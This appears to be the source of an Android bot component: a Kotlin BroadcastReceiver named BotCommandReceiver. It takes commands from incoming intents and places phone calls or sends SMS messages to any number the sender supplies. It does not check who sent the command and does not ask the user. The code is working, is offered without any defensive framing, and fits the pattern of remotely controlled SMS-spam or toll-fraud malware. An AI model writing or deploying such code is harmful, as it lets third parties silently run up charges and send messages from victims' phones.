package com.bot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.telephony.SmsManager
import android.util.Log

class BotCommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val command = intent?.getStringExtra("command") ?: return

        when (command) {
            "call" -> {
                val payload = intent.getStringExtra("payload") ?: return
                val callIntent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$payload")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context?.startActivity(callIntent)
            }
            "sms" -> {
                val number = intent.getStringExtra("number") ?: return
                val message = intent.getStringExtra("message") ?: return
                
                try {
                    val smsManager = context?.getSystemService(SmsManager::class.java)
                    smsManager?.sendTextMessage(number, null, message, null, null)
                    Log.d("bizzy", "SMS sent to $number")
                } catch (e: Exception) {
                    Log.e("bizzy", "Failed to send SMS: ${e.message}")
                }
            }
        }
    }
}